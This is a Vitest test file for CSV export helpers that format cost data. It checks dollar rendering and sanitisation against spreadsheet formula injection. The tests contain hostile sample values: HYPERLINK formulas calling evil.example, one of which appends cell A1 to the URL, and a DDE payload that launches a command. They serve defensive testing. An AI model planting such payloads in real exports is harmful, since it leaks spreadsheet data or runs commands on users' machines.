import { test, expect } from "vitest";
import { parse } from "csv-parse/sync";
import {
  groupsDailyToCsv,
  groupsToCsv,
  membersDailyLongToCsv,
  membersDailyToCsv,
  membersDailyCost,
  sanitizeCsvCell,
} from "./export.js";
import type { GroupDayRow, GroupRow } from "./aggregate.js";
import { userProductRow } from "./__fixtures__/index.js";

function rows(csv: string): Record<string, string>[] {
  return parse(csv, { columns: true }) as Record<string, string>[];
}

function group(overrides: Partial<GroupRow> = {}): GroupRow {
  return {
    key: "Acme",
    seats: 1,
    activeUsers: 1,
    activeUserDays: 1,
    costCents: 12345,
    avgCostPerSeat: 12345,
    avgCostPerActiveUser: 12345,
    avgTokensPerActiveUser: 10,
    totalTokens: 10,
    inputTokens: 0,
    outputTokens: 0,
    requests: 1,
    chatMessages: 0,
    ccSessions: 0,
    ccLocAdded: 0,
    ccCommits: 0,
    ccPrs: 0,
    coworkMessages: 0,
    webSearches: 0,
    costByProduct: {},
    ...overrides,
  };
}

test("groupsToCsv: cents render as a fixed 2-decimal dollar string", () => {
  const out = rows(
    groupsToCsv([group({ costCents: 12345, avgCostPerSeat: 6172.5, avgCostPerActiveUser: 12345 })], "project"),
  );
  expect(out[0]!.total_cost_usd).toBe("123.45");
  expect(out[0]!.avg_cost_per_seat_usd).toBe("61.73");
  expect(out[0]!.avg_cost_per_active_user_usd).toBe("123.45");
});

test("groupsToCsv: zero cost renders as 0.00, not blank", () => {
  const out = rows(groupsToCsv([group({ costCents: 0, avgCostPerSeat: 0, avgCostPerActiveUser: 0 })], "project"));
  expect(out[0]!.total_cost_usd).toBe("0.00");
});

test("groupsDailyToCsv: cents render as a fixed 2-decimal dollar string", () => {
  const row: GroupDayRow = { key: "Acme", date: "2026-06-01", costCents: 999, totalTokens: 5 };
  const out = rows(groupsDailyToCsv([row], "project"));
  expect(out[0]!.total_cost_usd).toBe("9.99");
});

test("membersDailyToCsv: per-day and total cents both render in dollars", () => {
  const out = rows(
    membersDailyToCsv(
      [
        {
          email: "a@x.com",
          attributes: null,
          costByDate: { "2026-06-01": 150 },
          totalCostCents: 150,
          totalTokens: 10,
          requests: 1,
        },
      ],
      ["2026-06-01"],
      [],
    ),
  );
  expect(out[0]!["2026-06-01"]).toBe("1.50");
  expect(out[0]!.total_cost_usd).toBe("1.50");
});

test("membersDailyLongToCsv: renders cost in dollars and omits days with no cost", () => {
  const out = rows(
    membersDailyLongToCsv(
      [
        {
          email: "a@x.com",
          attributes: null,
          costByDate: { "2026-06-01": 250 },
          totalCostCents: 250,
          totalTokens: 0,
          requests: 0,
        },
      ],
      ["2026-06-01", "2026-06-02"],
    ),
  );
  expect(out).toHaveLength(1);
  expect(out[0]).toEqual({ Member: "a@x.com", Date: "2026-06-01", Cost: "2.50" });
});

test("sanitizeCsvCell: neutralises formula-injection prefixes but leaves ordinary text alone", () => {
  expect(sanitizeCsvCell('=HYPERLINK("http://evil.example/","click")')).toBe(
    '\'=HYPERLINK("http://evil.example/","click")',
  );
  expect(sanitizeCsvCell("+1234")).toBe("'+1234");
  expect(sanitizeCsvCell("-1234")).toBe("'-1234");
  expect(sanitizeCsvCell("@SUM(A1)")).toBe("'@SUM(A1)");
  expect(sanitizeCsvCell("\tformula")).toBe("'\tformula");
  expect(sanitizeCsvCell("Acme")).toBe("Acme");
  expect(sanitizeCsvCell("a@x.com")).toBe("a@x.com");
});

test("groupsToCsv: a formula-injection project name round-trips without a leading =", () => {
  const out = rows(groupsToCsv([group({ key: '=HYPERLINK("http://evil.example/"&A1,"click")' })], "project"));
  expect(out[0]!.project!.startsWith("=")).toBe(false);
});

test("membersDailyToCsv: a formula-injection email and attribute value round-trip without a leading formula prefix", () => {
  const out = rows(
    membersDailyToCsv(
      [
        {
          email: "=cmd|'/c calc'!A0",
          attributes: { team: "+1;DDE" },
          costByDate: {},
          totalCostCents: 0,
          totalTokens: 0,
          requests: 0,
        },
      ],
      [],
      ["team"],
    ),
  );
  expect(out[0]!.email!.startsWith("=")).toBe(false);
  expect(out[0]!.team!.startsWith("+")).toBe(false);
});

test("membersDailyCost: builds a cents total per member across products, seeded from the full email list", () => {
  const { rows: members, dates } = membersDailyCost(
    [userProductRow({ email: "a@x.com", date: "2026-06-01", costCents: 100, totalTokens: 5, requests: 1 })],
    new Map(),
    ["a@x.com", "b@x.com"],
  );
  expect(dates).toEqual(["2026-06-01"]);
  const a = members.find((m) => m.email === "a@x.com")!;
  expect(a.totalCostCents).toBe(100);
  const b = members.find((m) => m.email === "b@x.com")!;
  expect(b.totalCostCents).toBe(0);
});
